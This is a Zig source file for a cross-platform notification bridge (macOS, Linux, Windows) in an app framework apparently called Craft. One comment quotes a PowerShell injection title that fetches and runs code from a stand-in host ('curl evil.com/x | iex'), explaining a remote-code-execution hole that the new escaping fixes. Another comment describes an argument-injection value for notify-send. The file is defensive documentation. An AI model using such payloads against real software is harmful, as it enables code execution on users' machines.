const std = @import("std");
const builtin = @import("builtin");
const bridge_error = @import("bridge_error.zig");
const logging = @import("logging.zig");
const io_context = @import("io_context.zig");
// Hoisted once instead of re-importing inside every callsite — previously
// `@import("macos.zig")` and `.objc.objc_msgSend` were pulled in four times
// in expression position.
const macos_mod = @import("macos.zig");

const BridgeError = bridge_error.BridgeError;
const log = logging.notification;

/// Bridge handler for native macOS notifications
/// Uses UNUserNotificationCenter for modern notification support
pub const NotificationBridge = struct {
    allocator: std.mem.Allocator,
    notification_center: ?*anyopaque = null,
    delegate: ?*anyopaque = null,
    pending_callbacks: std.StringHashMap([]const u8),

    const Self = @This();

    pub fn init(allocator: std.mem.Allocator) Self {
        const self = Self{
            .allocator = allocator,
            .pending_callbacks = std.StringHashMap([]const u8).init(allocator),
        };

        // Note: Notification center setup is deferred until first use
        // UNUserNotificationCenter requires proper app initialization

        return self;
    }

    fn ensureNotificationCenter(self: *Self) void {
        // Already initialized
        if (self.notification_center != null) return;

        if (comptime builtin.os.tag != .macos) return;

        const macos = @import("macos.zig");

        // Get UNUserNotificationCenter - may fail if app not properly initialized
        const UNUserNotificationCenter = macos.getClass("UNUserNotificationCenter");
        if (UNUserNotificationCenter == null) {
            log.warn("UNUserNotificationCenter class not available", .{});
            return;
        }

        // `currentNotificationCenter` raises NSInternalInconsistencyException
        // for a process with no bundle identifier — a bare `craft` binary run
        // from a shell — and an uncaught Objective-C exception aborts the
        // process. The comment that used to sit here warned this "can crash if
        // called too early"; the condition is the bundle, not the timing.
        if (!hasBundleIdentifier()) {
            log.warn("no bundle identifier; notifications need a packaged app", .{});
            return;
        }

        self.notification_center = macos.msgSend0(UNUserNotificationCenter, "currentNotificationCenter");

        if (self.notification_center) |center| {
            // UNAuthorizationOptionAlert | UNAuthorizationOptionSound | UNAuthorizationOptionBadge
            const options: c_ulong = (1 << 0) | (1 << 1) | (1 << 2);

            // Request authorization
            const msg = @as(*const fn (@TypeOf(center), macos_mod.objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&macos_mod.objc.objc_msgSend));
            msg(center, macos.sel("requestAuthorizationWithOptions:completionHandler:"), options, null);

            log.debug("Notification center initialized", .{});
        }
    }

    /// Handle notification-related messages from JavaScript
    pub fn handleMessage(self: *Self, action: []const u8, data: []const u8) !void {
        self.handleMessageInternal(action, data) catch |err| {
            self.reportError(action, err);
        };
    }

    fn handleMessageInternal(self: *Self, action: []const u8, data: []const u8) !void {
        if (std.mem.eql(u8, action, "show")) {
            try self.showNotification(data);
        } else if (std.mem.eql(u8, action, "schedule")) {
            try self.scheduleNotification(data);
        } else if (std.mem.eql(u8, action, "cancel")) {
            try self.cancelNotification(data);
        } else if (std.mem.eql(u8, action, "cancelAll")) {
            try self.cancelAllNotifications();
        } else if (std.mem.eql(u8, action, "setBadge")) {
            try self.setBadgeCount(data);
        } else if (std.mem.eql(u8, action, "clearBadge")) {
            try self.clearBadge();
        } else if (std.mem.eql(u8, action, "requestPermission")) {
            try self.requestPermission();
        } else {
            return BridgeError.UnknownAction;
        }
    }

    fn reportError(self: *Self, action: []const u8, err: anyerror) void {
        const bridge_err: BridgeError = switch (err) {
            BridgeError.MissingData => BridgeError.MissingData,
            BridgeError.InvalidJSON => BridgeError.InvalidJSON,
            else => BridgeError.NativeCallFailed,
        };
        bridge_error.sendErrorToJS(self.allocator, action, bridge_err);
    }

    /// Show an immediate notification.
    ///
    /// JSON: {"id", "title", "body", "subtitle", "sound", "actions":[{"id","label"}]}
    ///
    /// The doc comment here used to advertise an `"actionId"` field. Nothing
    /// has ever parsed it, and with real action buttons there is nothing for
    /// it to mean — a response names the button the user pressed, which the
    /// app already chose the id of. Removed rather than implemented.
    fn showNotification(self: *Self, data: []const u8) !void {
        if (builtin.os.tag == .linux) {
            try self.linuxShowNotification(data);
            return;
        } else if (builtin.os.tag == .windows) {
            try self.windowsShowNotification(data);
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        self.ensureNotificationCenter();
        const center = self.notification_center orelse return BridgeError.NativeCallFailed;
        const macos = @import("macos.zig");

        const ShowParams = struct {
            id: []const u8 = "default",
            title: []const u8 = "",
            body: []const u8 = "",
            subtitle: []const u8 = "",
            sound: bool = true,
            actions: []const ActionSpec = &.{},
        };

        const parsed = std.json.parseFromSlice(ShowParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const params = parsed.value;

        const id = params.id;
        const title = params.title;
        const body = params.body;
        const subtitle = params.subtitle;
        const sound = params.sound;

        log.debug("show: id={s}, title={s}, body={s}", .{ id, title, body });

        // Create UNMutableNotificationContent
        const UNMutableNotificationContent = macos.getClass("UNMutableNotificationContent");
        const content = macos.msgSend0(macos.msgSend0(UNMutableNotificationContent, "alloc"), "init");

        // Set title
        if (title.len > 0) {
            const title_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, title);
            defer self.allocator.free(title_cstr);
            const NSString = macos.getClass("NSString");
            const str_alloc = macos.msgSend0(NSString, "alloc");
            const ns_title = macos.msgSend1(str_alloc, "initWithUTF8String:", title_cstr.ptr);
            _ = macos.msgSend1(content, "setTitle:", ns_title);
        }

        // Set body
        if (body.len > 0) {
            const body_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, body);
            defer self.allocator.free(body_cstr);
            const NSString = macos.getClass("NSString");
            const str_alloc = macos.msgSend0(NSString, "alloc");
            const ns_body = macos.msgSend1(str_alloc, "initWithUTF8String:", body_cstr.ptr);
            _ = macos.msgSend1(content, "setBody:", ns_body);
        }

        // Set subtitle
        if (subtitle.len > 0) {
            const subtitle_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, subtitle);
            defer self.allocator.free(subtitle_cstr);
            const NSString = macos.getClass("NSString");
            const str_alloc = macos.msgSend0(NSString, "alloc");
            const ns_subtitle = macos.msgSend1(str_alloc, "initWithUTF8String:", subtitle_cstr.ptr);
            _ = macos.msgSend1(content, "setSubtitle:", ns_subtitle);
        }

        // Set sound
        if (sound) {
            const UNNotificationSound = macos.getClass("UNNotificationSound");
            const default_sound = macos.msgSend0(UNNotificationSound, "defaultSound");
            _ = macos.msgSend1(content, "setSound:", default_sound);
        }

        applyActions(content, params.actions);

        // Create trigger (nil for immediate)
        const trigger: ?*anyopaque = null;

        // Create request
        const id_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, id);
        defer self.allocator.free(id_cstr);
        const NSString = macos.getClass("NSString");
        const str_alloc = macos.msgSend0(NSString, "alloc");
        const ns_id = macos.msgSend1(str_alloc, "initWithUTF8String:", id_cstr.ptr);

        const UNNotificationRequest = macos.getClass("UNNotificationRequest");
        const request = macos.msgSend3(UNNotificationRequest, "requestWithIdentifier:content:trigger:", ns_id, content, trigger);

        // Add to notification center
        _ = macos.msgSend2(center, "addNotificationRequest:withCompletionHandler:", request, @as(?*anyopaque, null));

        log.debug("Notification scheduled: {s}", .{id});
    }

    /// Schedule a notification for later
    /// JSON: {"id": "reminder", "title": "Reminder", "body": "Time to take a break", "delay": 60}
    fn scheduleNotification(self: *Self, data: []const u8) !void {
        if (builtin.os.tag == .linux) {
            // Linux: notify-send doesn't support scheduling, show immediately with a note
            try self.linuxShowNotification(data);
            return;
        } else if (builtin.os.tag == .windows) {
            // Windows: Show immediately for simplicity
            try self.windowsShowNotification(data);
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        self.ensureNotificationCenter();
        const center = self.notification_center orelse return BridgeError.NativeCallFailed;
        const macos = @import("macos.zig");

        const ScheduleParams = struct {
            id: []const u8 = "scheduled",
            title: []const u8 = "",
            body: []const u8 = "",
            delay: f64 = 60.0,
            /// Buttons on the banner. Empty means a plain notification.
            actions: []const ActionSpec = &.{},
        };

        const parsed = std.json.parseFromSlice(ScheduleParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const params = parsed.value;

        const id = params.id;
        const title = params.title;
        const body = params.body;
        const delay = params.delay;

        log.debug("schedule: id={s}, delay={d}s", .{ id, delay });

        // Create content
        const UNMutableNotificationContent = macos.getClass("UNMutableNotificationContent");
        const content = macos.msgSend0(macos.msgSend0(UNMutableNotificationContent, "alloc"), "init");

        if (title.len > 0) {
            const title_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, title);
            defer self.allocator.free(title_cstr);
            const NSString = macos.getClass("NSString");
            const ns_title = macos.msgSend1(macos.msgSend0(NSString, "alloc"), "initWithUTF8String:", title_cstr.ptr);
            _ = macos.msgSend1(content, "setTitle:", ns_title);
        }

        if (body.len > 0) {
            const body_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, body);
            defer self.allocator.free(body_cstr);
            const NSString = macos.getClass("NSString");
            const ns_body = macos.msgSend1(macos.msgSend0(NSString, "alloc"), "initWithUTF8String:", body_cstr.ptr);
            _ = macos.msgSend1(content, "setBody:", ns_body);
        }

        // Add default sound
        const UNNotificationSound = macos.getClass("UNNotificationSound");
        const default_sound = macos.msgSend0(UNNotificationSound, "defaultSound");
        _ = macos.msgSend1(content, "setSound:", default_sound);

        applyActions(content, params.actions);

        // A trigger, unless the caller asked for now.
        //
        // `UNTimeIntervalNotificationTrigger` rejects an interval of zero, and
        // a nil trigger is how UserNotifications spells "immediately". This is
        // what `craft.notifications.show()` uses: it routes here, and with the
        // 60-second default it put every "show" a minute into the future —
        // which from the page looks exactly like a notification that never
        // arrived.
        const trigger: ?*anyopaque = if (delay > 0) blk: {
            const UNTimeIntervalNotificationTrigger = macos.getClass("UNTimeIntervalNotificationTrigger");
            const msg_trigger = @as(*const fn (@TypeOf(UNTimeIntervalNotificationTrigger), macos_mod.objc.SEL, f64, bool) callconv(.c) *anyopaque, @ptrCast(&macos_mod.objc.objc_msgSend));
            break :blk msg_trigger(UNTimeIntervalNotificationTrigger, macos.sel("triggerWithTimeInterval:repeats:"), delay, false);
        } else null;

        // Create request
        const id_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, id);
        defer self.allocator.free(id_cstr);
        const NSString = macos.getClass("NSString");
        const ns_id = macos.msgSend1(macos.msgSend0(NSString, "alloc"), "initWithUTF8String:", id_cstr.ptr);

        const UNNotificationRequest = macos.getClass("UNNotificationRequest");
        const request = macos.msgSend3(UNNotificationRequest, "requestWithIdentifier:content:trigger:", ns_id, content, trigger);

        // Add to center
        _ = macos.msgSend2(center, "addNotificationRequest:withCompletionHandler:", request, @as(?*anyopaque, null));
    }

    /// Cancel a pending notification
    /// JSON: {"id": "reminder"}
    fn cancelNotification(self: *Self, data: []const u8) !void {
        if (builtin.os.tag == .linux or builtin.os.tag == .windows) {
            // Linux/Windows: notify-send doesn't support cancellation
            _ = &data;
            log.debug("cancel: not supported on this platform", .{});
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        self.ensureNotificationCenter();
        const center = self.notification_center orelse return BridgeError.NativeCallFailed;
        const macos = @import("macos.zig");

        const IdParams = struct {
            id: []const u8 = "",
        };

        const parsed = std.json.parseFromSlice(IdParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const id = parsed.value.id;

        if (id.len == 0) return BridgeError.MissingData;

        log.debug("cancel: {s}", .{id});

        const id_cstr = try @import("memory.zig").dupeZ(self.allocator, u8, id);
        defer self.allocator.free(id_cstr);

        const NSString = macos.getClass("NSString");
        const ns_id = macos.msgSend1(macos.msgSend0(NSString, "alloc"), "initWithUTF8String:", id_cstr.ptr);

        const NSArray = macos.getClass("NSArray");
        const ids_array = macos.msgSend1(NSArray, "arrayWithObject:", ns_id);

        _ = macos.msgSend1(center, "removePendingNotificationRequestsWithIdentifiers:", ids_array);
        _ = macos.msgSend1(center, "removeDeliveredNotificationsWithIdentifiers:", ids_array);
    }

    /// Cancel all pending notifications
    fn cancelAllNotifications(self: *Self) !void {
        if (builtin.os.tag == .linux or builtin.os.tag == .windows) {
            log.debug("cancelAll: not supported on this platform", .{});
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        self.ensureNotificationCenter();
        const center = self.notification_center orelse return BridgeError.NativeCallFailed;
        const macos = @import("macos.zig");

        log.debug("cancelAll", .{});

        _ = macos.msgSend0(center, "removeAllPendingNotificationRequests");
        _ = macos.msgSend0(center, "removeAllDeliveredNotifications");
    }

    /// Set app badge count
    /// JSON: {"count": 5}
    fn setBadgeCount(self: *Self, data: []const u8) !void {
        if (builtin.os.tag == .linux or builtin.os.tag == .windows) {
            _ = &data;
            log.debug("setBadge: not supported on this platform", .{});
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        const macos = @import("macos.zig");

        const BadgeParams = struct {
            count: i64 = 0,
        };

        const parsed = std.json.parseFromSlice(BadgeParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const count = parsed.value.count;

        log.debug("setBadge: {}", .{count});

        // Set dock badge
        const NSApplication = macos.getClass("NSApplication");
        const app = macos.msgSend0(NSApplication, "sharedApplication");
        const dock_tile = macos.msgSend0(app, "dockTile");

        if (count > 0) {
            // Use bufPrintZ to produce a guaranteed null-terminated slice.
            // The previous version cast a non-null-terminated bufPrint slice
            // to `[*:0]const u8`, which is undefined behavior — the ObjC
            // `initWithUTF8String:` implementation reads until it finds a
            // zero byte, potentially overrunning into adjacent stack.
            var buf: [32]u8 = undefined;
            const count_str = @import("memory.zig").bufPrintZ(&buf, "{}", .{count}) catch "0";

            const NSString = macos.getClass("NSString");
            const ns_count = macos.msgSend1(macos.msgSend0(NSString, "alloc"), "initWithUTF8String:", count_str.ptr);
            _ = macos.msgSend1(dock_tile, "setBadgeLabel:", ns_count);
        } else {
            _ = macos.msgSend1(dock_tile, "setBadgeLabel:", @as(?*anyopaque, null));
        }
    }

    /// Clear app badge
    fn clearBadge(self: *Self) !void {
        if (builtin.os.tag == .linux or builtin.os.tag == .windows) {
            log.debug("clearBadge: not supported on this platform", .{});
            return;
        }
        if (comptime builtin.os.tag != .macos) return;
        _ = self;

        const macos = @import("macos.zig");

        log.debug("clearBadge", .{});

        const NSApplication = macos.getClass("NSApplication");
        const app = macos.msgSend0(NSApplication, "sharedApplication");
        const dock_tile = macos.msgSend0(app, "dockTile");
        _ = macos.msgSend1(dock_tile, "setBadgeLabel:", @as(?*anyopaque, null));
    }

    /// Request notification permission
    fn requestPermission(self: *Self) !void {
        if (builtin.os.tag == .linux or builtin.os.tag == .windows) {
            // Linux/Windows: permissions are typically not required
            log.debug("requestPermission: granted by default on this platform", .{});
            bridge_error.sendResultToJS(self.allocator, "requestPermission", "{\"granted\":true}");
            return;
        }
        if (comptime builtin.os.tag != .macos) return;

        self.ensureNotificationCenter();
        const center = self.notification_center orelse return BridgeError.NativeCallFailed;
        const macos = @import("macos.zig");

        log.debug("requestPermission", .{});

        // UNAuthorizationOptionAlert | UNAuthorizationOptionSound | UNAuthorizationOptionBadge
        const options: c_ulong = (1 << 0) | (1 << 1) | (1 << 2);

        const msg = @as(*const fn (@TypeOf(center), macos_mod.objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&macos_mod.objc.objc_msgSend));
        msg(center, macos.sel("requestAuthorizationWithOptions:completionHandler:"), options, null);
    }

    // ============================================
    // Linux Notification Implementation (notify-send)
    // ============================================

    fn linuxShowNotification(self: *Self, data: []const u8) !void {
        const LinuxNotifParams = struct {
            title: []const u8 = "Notification",
            body: []const u8 = "",
            style: []const u8 = "normal",
        };

        const parsed = std.json.parseFromSlice(LinuxNotifParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const params = parsed.value;

        const title = params.title;
        const body = params.body;
        const urgency = if (std.mem.eql(u8, params.style, "critical"))
            "critical"
        else if (std.mem.eql(u8, params.style, "low"))
            "low"
        else
            "normal";

        log.debug("Linux show: title={s}, body={s}", .{ title, body });

        // Build args for notify-send.
        //
        // Three fixes versus the previous version:
        //   - Use Zig 0.16's unmanaged ArrayList (with explicit allocator
        //     passed to `append`) — the old managed API was removed.
        //   - Prepend `--` before positional args so a `title` starting with
        //     `--hint=string:transient:1` (or similar) can't be interpreted
        //     as a notify-send flag.
        //   - Drive the child through `std.process.spawn(io, .{...})` to stay
        //     consistent with the other bridges.
        var args: std.ArrayListUnmanaged([]const u8) = .empty;
        defer args.deinit(self.allocator);

        try args.append(self.allocator, "notify-send");
        try args.append(self.allocator, "--urgency");
        try args.append(self.allocator, urgency);
        try args.append(self.allocator, "--");
        try args.append(self.allocator, title);
        if (body.len > 0) {
            try args.append(self.allocator, body);
        }

        const io = io_context.get();
        var child = std.process.spawn(io, .{
            .argv = args.items,
            .stdout = .ignore,
            .stderr = .ignore,
            .stdin = .ignore,
        }) catch |err| {
            log.debug("notify-send spawn failed: {}", .{err});
            return;
        };
        _ = child.wait(io) catch |err| {
            log.debug("notify-send wait failed: {}", .{err});
        };

        log.debug("Linux: notification sent", .{});
    }

    // ============================================
    // Windows Notification Implementation (PowerShell Toast)
    // ============================================

    fn windowsShowNotification(self: *Self, data: []const u8) !void {
        if (builtin.os.tag != .windows) {
            _ = &self;
            _ = &data;
            return;
        }

        const WinNotifParams = struct {
            title: []const u8 = "Notification",
            body: []const u8 = "",
        };

        const parsed = std.json.parseFromSlice(WinNotifParams, self.allocator, data, .{
            .ignore_unknown_fields = true,
            .allocate = .alloc_always,
        }) catch return BridgeError.InvalidJSON;
        defer parsed.deinit();
        const title = parsed.value.title;
        const body = parsed.value.body;

        log.debug("Windows show: title={s}, body={s}", .{ title, body });

        // Build the PowerShell script safely.
        //
        // CRITICAL: the previous implementation interpolated `title` and `body`
        // directly into a PowerShell script as unquoted bytes. A title like
        // `"));Invoke-Expression("curl evil.com/x | iex` executed arbitrary
        // PowerShell with user privileges — a remote code execution vector
        // driven by any JS that could call this notification API.
        //
        // Fix: escape every PowerShell double-quoted string special:
        //   `"`  -> `""`   (PS double-quote escape within `"..."`)
        //   `` ` `` -> `` `` `` (PS backtick escape)
        //   `$`  -> `` `$ ``   (prevents variable expansion)
        const title_esc = try escapePsDoubleQuoted(self.allocator, title);
        defer self.allocator.free(title_esc);
        const body_esc = try escapePsDoubleQuoted(self.allocator, body);
        defer self.allocator.free(body_esc);

        const ps_script = try std.fmt.allocPrint(self.allocator,
            \\[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
            \\$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
            \\$textNodes = $template.GetElementsByTagName("text")
            \\$textNodes.Item(0).AppendChild($template.CreateTextNode("{s}")) > $null
            \\$textNodes.Item(1).AppendChild($template.CreateTextNode("{s}")) > $null
            \\$toast = [Windows.UI.Notifications.ToastNotification]::new($template)
            \\[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Craft App").Show($toast)
        , .{ title_esc, body_esc });
        defer self.allocator.free(ps_script);

        const io = io_context.get();
        var child = std.process.spawn(io, .{
            .argv = &.{ "powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script },
            .stdout = .ignore,
            .stderr = .ignore,
            .stdin = .ignore,
        }) catch |err| {
            log.debug("powershell spawn failed: {}", .{err});
            return;
        };
        _ = child.wait(io) catch |err| {
            log.debug("powershell wait failed: {}", .{err});
        };

        log.debug("Windows: notification sent", .{});
    }

    /// Escape a string so it's safe to embed inside a PowerShell double-quoted
    /// literal (`"..."`). The caller owns the returned buffer.
    fn escapePsDoubleQuoted(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
        var out: std.ArrayListUnmanaged(u8) = .empty;
        errdefer out.deinit(allocator);

        for (s) |c| {
            switch (c) {
                '"' => try out.appendSlice(allocator, "\"\""),
                '`' => try out.appendSlice(allocator, "``"),
                '$' => try out.appendSlice(allocator, "`$"),
                // Drop control bytes — these can terminate the command line on
                // Windows (e.g. CR/LF) and have no legitimate role in a
                // notification title.
                0, '\r', '\n' => try out.append(allocator, ' '),
                else => try out.append(allocator, c),
            }
        }

        return out.toOwnedSlice(allocator);
    }

    pub fn deinit(self: *Self) void {
        // Free both the duped key AND the duped value — previously the
        // values leaked on every shutdown even when the stored callback
        // ids were heap-allocated.
        var it = self.pending_callbacks.iterator();
        while (it.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            self.allocator.free(entry.value_ptr.*);
        }
        self.pending_callbacks.deinit();
    }
};

// =============================================================================
// Responses: clicks and action buttons (#65)
// =============================================================================
//
// A banner with nothing behind it is a dead end. Craft posted real
// `UNUserNotificationCenter` notifications but registered no delegate, so a
// click on one reached nothing — the page was never told the user had
// answered. Action buttons did not exist at all, and `showNotification`'s doc
// comment advertised an `"actionId"` field that no code has ever parsed.
//
// Two things are needed and they are not the same thing:
//
//   - `didReceiveNotificationResponse:` is how a click or a button press comes
//     back. Without it the banner is decoration.
//   - `willPresentNotification:` is how a notification appears *at all* while
//     the app is frontmost. Without it macOS suppresses the banner, which is
//     indistinguishable from a broken notification and is the first thing
//     anyone testing this hits.

const notification_actions = @import("notification_actions.zig");
const capabilities = @import("capabilities.zig");
const objc = macos_mod.objc;

/// Enough of the block ABI to call a completion handler that was handed to us.
/// `{isa, flags, reserved, invoke, descriptor}` is fixed layout; `invoke`
/// takes the block itself first.
fn CompletionBlock(comptime Arg: type) type {
    return extern struct {
        isa: ?*anyopaque,
        flags: c_int,
        reserved: c_int,
        invoke: *const fn (*anyopaque, Arg) callconv(.c) void,
    };
}

/// A completion handler taking nothing at all.
const VoidBlock = extern struct {
    isa: ?*anyopaque,
    flags: c_int,
    reserved: c_int,
    invoke: *const fn (*anyopaque) callconv(.c) void,
};

/// Whether this process has a bundle identifier.
///
/// `UNUserNotificationCenter currentNotificationCenter` raises
/// `NSInternalInconsistencyException` for a process without one — a bare
/// `craft` binary run from a shell rather than an `.app`. An uncaught
/// Objective-C exception is a hard abort, so every path that touches the
/// notification centre has to ask first. The existing code carried a comment
/// warning that it "can crash if called too early"; this is the actual
/// condition.
fn hasBundleIdentifier() bool {
    if (comptime builtin.os.tag != .macos) return false;
    const NSBundle = macos_mod.getClass("NSBundle");
    if (@intFromPtr(NSBundle) == 0) return false;
    const bundle = macos_mod.msgSend0(NSBundle, "mainBundle");
    if (@intFromPtr(bundle) == 0) return false;
    return @intFromPtr(macos_mod.msgSend0(bundle, "bundleIdentifier")) != 0;
}

var response_delegate_installed = false;
var click_emitter: ?capabilities.Emitter = null;
var action_emitter: ?capabilities.Emitter = null;

/// Attach the delegate that turns a notification into an event.
///
/// Called during startup rather than lazily on first `show`, because Apple
/// requires the delegate to be set before the app finishes launching: a
/// notification the *user clicked to launch the app* is delivered during
/// launch, and a delegate installed afterwards has already missed it. That is
/// what the app-delegate install point (#63) exists for.
pub fn installResponseDelegate() void {
    if (comptime builtin.os.tag != .macos) return;
    if (response_delegate_installed) return;
    // No bundle, no notification centre — and asking would abort the process.
    if (!hasBundleIdentifier()) return;

    const UNUserNotificationCenter = macos_mod.getClass("UNUserNotificationCenter");
    if (@intFromPtr(UNUserNotificationCenter) == 0) return;

    const class_name = "CraftNotificationDelegate";
    var cls = objc.objc_getClass(class_name);
    if (cls == null) {
        cls = objc.objc_allocateClassPair(macos_mod.getClass("NSObject"), class_name, 0);
        if (cls == null) return;

        // void; self, _cmd, center, response, completionHandler (block)
        _ = objc.class_addMethod(
            cls,
            macos_mod.sel("userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:"),
            @as(objc.IMP, @ptrCast(@constCast(&handleNotificationResponse))),
            "v@:@@@?",
        );
        // void; self, _cmd, center, notification, completionHandler (block)
        _ = objc.class_addMethod(
            cls,
            macos_mod.sel("userNotificationCenter:willPresentNotification:withCompletionHandler:"),
            @as(objc.IMP, @ptrCast(@constCast(&handleWillPresent))),
            "v@:@@@?",
        );

        objc.objc_registerClassPair(cls);
    }

    const center = macos_mod.msgSend0(UNUserNotificationCenter, "currentNotificationCenter");
    if (@intFromPtr(center) == 0) return;

    // `delegate` is a weak reference; the +1 from alloc/init is what keeps this
    // alive for the life of the process.
    const delegate = macos_mod.msgSend0(macos_mod.msgSend0(@as(objc.id, @ptrCast(@alignCast(cls))), "alloc"), "init");
    macos_mod.msgSendVoid1(center, "setDelegate:", delegate);
    response_delegate_installed = true;

    // The permits to emit on these channels, taken out at the point they
    // become deliverable. `craft.capabilities()` reports them from these lines
    // running, not from a table asserting they should have.
    click_emitter = capabilities.registerEmitter(.notification_click);
    action_emitter = capabilities.registerEmitter(.notification_action);

    log.debug("notification response delegate installed", .{});
}

/// `userNotificationCenter:willPresentNotification:withCompletionHandler:`
///
/// Answering with the presentation options is what lets a notification appear
/// while the app is frontmost. macOS suppresses it otherwise, and craft had no
/// delegate to answer at all — so an app that notified while focused showed
/// nothing, which looks exactly like a broken notification.
fn handleWillPresent(_: objc.id, _: objc.SEL, _: objc.id, _: objc.id, completion: objc.id) callconv(.c) void {
    // UNNotificationPresentationOptionBanner (1<<4) | ...List (1<<3) | ...Sound (1<<1).
    // Banner and List replace the deprecated Alert (1<<2) on macOS 11+.
    const options: c_ulong = (1 << 4) | (1 << 3) | (1 << 1);
    const handler = completion orelse return;
    const block: *CompletionBlock(c_ulong) = @ptrCast(@alignCast(handler));
    block.invoke(handler, options);
}

/// `userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:`
///
/// The completion handler must be called on every path out. Dropping it does
/// not fail anything visibly — it leaks the response and, repeated, gets the
/// app's notification delivery throttled.
fn handleNotificationResponse(_: objc.id, _: objc.SEL, _: objc.id, response: objc.id, completion: objc.id) callconv(.c) void {
    defer if (completion) |handler| {
        const block: *VoidBlock = @ptrCast(@alignCast(handler));
        block.invoke(handler);
    };

    if (@intFromPtr(response) == 0) return;

    var id_buf: [256]u8 = undefined;
    var action_buf: [256]u8 = undefined;

    const notification = macos_mod.msgSend0(response, "notification");
    const request = macos_mod.msgSend0(notification, "request");
    const notification_id = copyNSString(macos_mod.msgSend0(request, "identifier"), &id_buf) orelse return;
    const action_id = copyNSString(macos_mod.msgSend0(response, "actionIdentifier"), &action_buf) orelse return;

    switch (notification_actions.classify(action_id)) {
        .opened => {
            // Named through the emitter rather than spelled again here, so the
            // string the page listens for and the string `craft.capabilities()`
            // reports are one string.
            const emitter = click_emitter orelse return;
            emitNotificationEvent(emitter.eventName(), notification_id, null);
        },
        .dismissed => {
            const emitter = action_emitter orelse return;
            emitNotificationEvent(
                emitter.eventName(),
                notification_id,
                notification_actions.dismiss_public_id,
            );
        },
        .action => |id| {
            const emitter = action_emitter orelse return;
            emitNotificationEvent(emitter.eventName(), notification_id, id);
        },
    }
}

/// Read an `NSString` into `buf`. Null if it does not fit — better a dropped
/// event than a truncated identifier the page would match against the wrong
/// notification.
fn copyNSString(str: objc.id, buf: []u8) ?[]const u8 {
    if (@intFromPtr(str) == 0) return null;
    const raw = macos_mod.msgSend0(str, "UTF8String") orelse return null;
    const cstr: [*:0]const u8 = @ptrCast(@alignCast(raw));
    const slice = std.mem.span(cstr);
    if (slice.len > buf.len) return null;
    @memcpy(buf[0..slice.len], slice);
    return buf[0..slice.len];
}

fn emitNotificationEvent(event: []const u8, notification_id: []const u8, action_id: ?[]const u8) void {
    const allocator = std.heap.c_allocator;

    var id_escaped: [1024]u8 = undefined;
    const id_json = bridge_error.escapeJsonString(&id_escaped, notification_id) catch return;

    var detail: std.ArrayListUnmanaged(u8) = .empty;
    defer detail.deinit(allocator);
    detail.appendSlice(allocator, "{\"notificationId\":\"") catch return;
    detail.appendSlice(allocator, id_json) catch return;
    detail.append(allocator, '"') catch return;
    if (action_id) |action| {
        var action_escaped: [1024]u8 = undefined;
        const action_json = bridge_error.escapeJsonString(&action_escaped, action) catch return;
        detail.appendSlice(allocator, ",\"actionId\":\"") catch return;
        detail.appendSlice(allocator, action_json) catch return;
        detail.append(allocator, '"') catch return;
    }
    detail.append(allocator, '}') catch return;

    const script = std.fmt.allocPrint(
        allocator,
        "if(window.dispatchEvent)window.dispatchEvent(new CustomEvent('{s}',{{detail:{s}}}));",
        .{ event, detail.items },
    ) catch return;
    defer allocator.free(script);

    @import("bridge.zig").evalJS(script) catch |err| {
        log.debug("could not deliver {s}: {}", .{ event, err });
    };
}

// =============================================================================
// Action buttons
// =============================================================================
//
// Buttons live on a `UNNotificationCategory`, not on the notification: the
// content names a category, the category holds the actions, and the response
// names the action pressed. Categories are registered as a **set** —
// `setNotificationCategories:` replaces whatever was there — so they cannot be
// made per notification and discarded. They are keyed by their shape (see
// `notification_actions.zig`) and accumulated here.

/// How many distinct button shapes one process may register.
///
/// An app has a handful: an approve/deny prompt, a "view"/"dismiss" pair.
/// Anything generating shapes without bound is building category identifiers
/// from data, which is a bug this limit surfaces instead of hiding.
const max_categories = 32;

const CategoryEntry = struct {
    id: [notification_actions.category_id_len]u8 = undefined,
    used: bool = false,
};

var categories: [max_categories]CategoryEntry = @splat(.{});
var category_count: usize = 0;

fn findCategory(id: []const u8) bool {
    for (categories[0..category_count]) |entry| {
        if (entry.used and std.mem.eql(u8, &entry.id, id)) return true;
    }
    return false;
}

/// Register the category these actions form, if it is not already registered,
/// and return its identifier.
///
/// Null when the actions cannot be served — no bundle, no notification centre,
/// or the table is full. The caller posts the notification without buttons
/// rather than not at all: a banner with no buttons still says the thing.
fn ensureCategory(actions: []const notification_actions.Action, id_buf: []u8) ?[]const u8 {
    if (comptime builtin.os.tag != .macos) return null;
    if (actions.len == 0) return null;
    if (!hasBundleIdentifier()) return null;

